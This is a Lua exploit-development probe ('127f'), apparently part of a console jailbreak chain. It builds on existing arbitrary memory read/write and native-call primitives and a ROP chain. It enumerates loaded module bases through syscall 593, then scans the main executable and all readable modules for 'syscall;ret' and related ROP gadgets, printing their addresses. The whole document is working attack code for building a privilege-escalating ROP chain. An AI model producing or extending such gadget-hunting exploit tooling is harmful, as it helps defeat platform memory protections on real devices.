-- CRASH_CLASS: LOW
-- PROBE 127f: Scan readable module for syscall;ret + bare syscall context
--
-- 127e found 5 bare syscall in eboot (no ret after any), 4 write gadgets,
-- and a readable module at base ~0xF8410000 size 0x114000.
-- This probe:
-- [A] Read bytes after each of the 5 bare syscalls to find usable continuations
-- [B] Scan the READABLE MODULE for syscall;ret (0F 05 C3)
-- [C] Read fn_addr value to get the actual syscall stub address
-- [D] If syscall;ret found in module, verify bytes

print("=== PROBE 127f: SYSCALL MODULE SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
local E = N(uint64(string.format("0x%X%08X", text_hi, text_lo)))
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

-- [A] Bytes after each bare syscall in eboot
print("")
print("[A] Bare syscall continuations in eboot")

local bare_offsets = {0x93CBD, 0x1017E2, 0x12403C, 0x1577A6, 0x2BBC23}
local PAT_SYSCALL_RET = string.char(0x0F, 0x05, 0xC3)
local PAT_SYSCALL = string.char(0x0F, 0x05)

for _, off in ipairs(bare_offsets) do
    local addr = uint64(string.format("0x%X%08X", text_hi, text_lo + off))
    local ok, data = pcall(function() return memory.read_buffer(addr, 16) end)
    if ok and type(data) == "string" and #data >= 8 then
        local hex = ""
        for i = 1, math.min(16, #data) do
            hex = hex .. string.format("%02X ", string.byte(data, i))
        end
        -- Byte after syscall (0F 05) is at position 3
        local after1 = string.byte(data, 3) or 0
        local after2 = string.byte(data, 4) or 0
        local tag = ""
        if after1 == 0xC3 then tag = "*** SYSCALL;RET! ***"
        elseif after1 == 0x90 and after2 == 0xC3 then tag = "NOP;RET"
        elseif after1 == 0x5F and after2 == 0xC3 then tag = "POP RDI;RET"
        elseif after1 == 0x58 and after2 == 0xC3 then tag = "POP RAX;RET"
        elseif after1 == 0xC9 then tag = "LEAVE"
        elseif after1 == 0x48 and after2 == 0xCF then tag = "REX IRETQ"
        elseif after1 == 0xEB then tag = "JMP short"
        elseif after1 == 0xE9 then tag = "JMP near"
        elseif after1 == 0xFF then tag = "JMP/CALL indirect"
        elseif after1 == 0x8E then tag = "MOV seg (CRASH ring3)"
        elseif after1 == 0x0F then tag = "two-byte opcode"
        else tag = string.format("next=%02X %02X", after1, after2) end
        print(string.format("  +0x%X: %s %s", off, hex, tag))
    else
        print(string.format("  +0x%X: read failed", off))
    end
end

if not alive() then print("DIED!") return end

-- [B] Scan readable module for syscall;ret
print("")
print("[B] Readable module scan")

-- Find the module that entry[79] belongs to
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local ROP = N(uint64(rop_str))
local entry79 = rq(ROP + 79 * 8)
local e79_h, e79_l = 0, 0
if entry79 then
    e79_h, e79_l = get_hi_lo(entry79)
    if e79_h < 0 then e79_h = e79_h + 0x100000000 end
    if e79_l < 0 then e79_l = e79_l + 0x100000000 end
end

-- Get ALL module bases and find the one containing entry79
local sc_info = mk(593)
local mod_base_lo, mod_base_hi, mod_size = 0, 0, 0

local mod_info = memory.alloc(0x200)
for handle = 0, 38 do
    wd(N(mod_info), 0x160)
    local ok = pcall(function() sc_info(uint64(handle), mod_info) end)
    if ok then
        local m_lo = rd(N(mod_info) + 0x108) or 0
        local m_hi = rd(N(mod_info) + 0x10C) or 0
        local m_sz = rd(N(mod_info) + 0x110) or 0
        if m_lo < 0 then m_lo = m_lo + 0x100000000 end
        if m_hi < 0 then m_hi = m_hi + 0x100000000 end
        if m_sz < 0 then m_sz = m_sz + 0x100000000 end

        if m_hi == e79_h and e79_l >= m_lo and e79_l < m_lo + m_sz then
            if mod_size == 0 then
                mod_base_lo = m_lo
                mod_base_hi = m_hi
                mod_size = m_sz
                print(string.format("  module handle=%d base=0x%X%08X size=0x%X",
                    handle, m_hi, m_lo, m_sz))
            end
            break
        end
    end
end

if mod_size > 0 then
    -- Scan module for syscall;ret and bare syscall
    local CHUNK = 0x10000
    local sc_ret_found = {}
    local sc_bare_found = {}

    for base_off = 0, mod_size - 1, CHUNK - 4 do
        local read_size = CHUNK
        if base_off + read_size > mod_size then
            read_size = mod_size - base_off
        end
        if read_size < 4 then break end

        local addr = uint64(string.format("0x%X%08X", mod_base_hi, mod_base_lo + base_off))
        local ok, chunk = pcall(function() return memory.read_buffer(addr, read_size) end)
        if not ok or type(chunk) ~= "string" then
            -- Module might be partially XO — stop but report how far we got
            print(string.format("  read_buffer failed at mod+0x%X (XO boundary?)", base_off))
            break
        end

        -- syscall;ret
        local pos = 1
        while #sc_ret_found < 20 do
            local f = string.find(chunk, PAT_SYSCALL_RET, pos, true)
            if not f then break end
            sc_ret_found[#sc_ret_found + 1] = base_off + f - 1
            pos = f + 1
        end

        -- bare syscall (first 10)
        pos = 1
        while #sc_bare_found < 10 do
            local f = string.find(chunk, PAT_SYSCALL, pos, true)
            if not f then break end
            sc_bare_found[#sc_bare_found + 1] = base_off + f - 1
            pos = f + 1
        end

        if base_off % 0x40000 == 0 and base_off > 0 then
            print(string.format("  scanned mod+0x%X/%X sr=%d sb=%d",
                base_off, mod_size, #sc_ret_found, #sc_bare_found))
        end
    end

    print("")
    if #sc_ret_found > 0 then
        print(string.format("  *** SYSCALL;RET FOUND: %d instances ***", #sc_ret_found))
        for i, off in ipairs(sc_ret_found) do
            if i > 10 then break end
            print(string.format("    mod+0x%X (abs 0x%X%08X)",
                off, mod_base_hi, mod_base_lo + off))
        end
    else
        print("  syscall;ret NOT FOUND in readable module range")
    end

    if #sc_bare_found > 0 then
        print(string.format("  bare syscall: %d instances", #sc_bare_found))
        for i, off in ipairs(sc_bare_found) do
            if i > 5 then break end
            -- Read bytes after each
            local sa = uint64(string.format("0x%X%08X",
                mod_base_hi, mod_base_lo + off))
            local sok, sd = pcall(function() return memory.read_buffer(sa, 8) end)
            if sok and type(sd) == "string" and #sd >= 4 then
                local hex = ""
                for j = 1, math.min(8, #sd) do
                    hex = hex .. string.format("%02X ", string.byte(sd, j))
                end
                print(string.format("    mod+0x%X: %s", off, hex))
            end
        end
    end
else
    print("  module not found for entry[79]!")
end

if not alive() then print("DIED!") return end

-- [C] Read fn_addr value from pipe struct
print("")
print("[C] fn_addr stub analysis")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if fn_str then
    local fn_ptr = uint64(fn_str)
    print("  fn_addr pointer = " .. fn_str)

    -- fn_addr itself might be a function address or a pointer to one
    -- Try reading bytes at fn_addr
    local fn_ok, fn_data = pcall(function() return memory.read_buffer(fn_ptr, 32) end)
    if fn_ok and type(fn_data) == "string" then
        print(string.format("  fn_addr is READABLE (%d bytes)", #fn_data))
        local hex = "  bytes: "
        for i = 1, math.min(32, #fn_data) do
            hex = hex .. string.format("%02X ", string.byte(fn_data, i))
        end
        print(hex)

        -- Check if it looks like code (function prologue) or data
        local b0 = string.byte(fn_data, 1)
        if b0 == 0x55 or b0 == 0x48 or b0 == 0x57 or b0 == 0x56 or b0 == 0x41 then
            print("  looks like CODE (function prologue)")
            -- Search for syscall in this function
            local sc = string.find(fn_data, PAT_SYSCALL, 1, true)
            if sc then
                print(string.format("  *** SYSCALL at fn_addr+0x%X ***", sc - 1))
            end
        else
            print("  looks like DATA (struct/vtable)")
            -- Read qwords as potential pointers
            for off = 0, 24, 8 do
                local qv = rq(N(fn_ptr) + off)
                if qv then
                    print(string.format("    +%02X: %s", off, fmt(qv)))
                end
            end
        end
    else
        print("  fn_addr is NOT readable (XO or invalid)")
    end
end

-- [D] Also scan ALL 39 modules for readable ones with syscall
print("")
print("[D] Module readability survey (first 16 bytes each)")
local readable_mods = {}
for handle = 0, 38 do
    wd(N(mod_info), 0x160)
    local ok = pcall(function() sc_info(uint64(handle), mod_info) end)
    if ok then
        local m_lo = rd(N(mod_info) + 0x108) or 0
        local m_hi = rd(N(mod_info) + 0x10C) or 0
        local m_sz = rd(N(mod_info) + 0x110) or 0
        if m_lo < 0 then m_lo = m_lo + 0x100000000 end
        if m_hi < 0 then m_hi = m_hi + 0x100000000 end
        if m_sz < 0 then m_sz = m_sz + 0x100000000 end

        if m_sz > 0 then
            local addr = uint64(string.format("0x%X%08X", m_hi, m_lo))
            local rok, rdata = pcall(function() return memory.read_buffer(addr, 16) end)
            local is_readable = (rok and type(rdata) == "string" and #rdata >= 4)
            if is_readable then
                local hex = ""
                for i = 1, 4 do
                    hex = hex .. string.format("%02X", string.byte(rdata, i))
                end
                -- Check if already in our list (dedup by base)
                local dup = false
                for _, rm in ipairs(readable_mods) do
                    if rm[1] == m_hi and rm[2] == m_lo then dup = true; break end
                end
                if not dup then
                    readable_mods[#readable_mods + 1] = {m_hi, m_lo, m_sz, handle, hex}
                end
            end
        end
    end
end

print(string.format("  %d unique readable modules:", #readable_mods))
for _, rm in ipairs(readable_mods) do
    print(string.format("    h=%d base=0x%X%08X size=0x%X first4=%s",
        rm[4], rm[1], rm[2], rm[3], rm[5]))
end

-- [E] Quick scan of ALL readable modules for syscall;ret
print("")
print("[E] Full syscall;ret hunt across all readable modules")
local total_sr = 0
for _, rm in ipairs(readable_mods) do
    local mhi, mlo, msz = rm[1], rm[2], rm[3]
    local mhandle = rm[4]
    -- Already scanned the entry79 module in [B], skip it
    if mhi == mod_base_hi and mlo == mod_base_lo then
        -- already done
    else
        local CHUNK = 0x10000
        local found_here = {}
        local scan_ok = true
        for base_off = 0, msz - 1, CHUNK - 4 do
            local rs = CHUNK
            if base_off + rs > msz then rs = msz - base_off end
            if rs < 4 then break end

            local addr = uint64(string.format("0x%X%08X", mhi, mlo + base_off))
            local ok2, chunk = pcall(function() return memory.read_buffer(addr, rs) end)
            if not ok2 or type(chunk) ~= "string" then
                scan_ok = false
                break
            end

            local pos = 1
            while #found_here < 20 do
                local f = string.find(chunk, PAT_SYSCALL_RET, pos, true)
                if not f then break end
                found_here[#found_here + 1] = base_off + f - 1
                pos = f + 1
            end
        end

        if #found_here > 0 then
            total_sr = total_sr + #found_here
            print(string.format("  h=%d 0x%X%08X: *** %d SYSCALL;RET ***",
                mhandle, mhi, mlo, #found_here))
            for _, off in ipairs(found_here) do
                print(string.format("    +0x%X (abs 0x%X%08X)", off, mhi, mlo + off))
            end
        end

        if not scan_ok then
            -- Report partial scan
        end
    end

    if not alive() then print("DIED during module scan!") return end
end

if total_sr == 0 then
    print("  no syscall;ret found in any readable module")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127f COMPLETE ===")
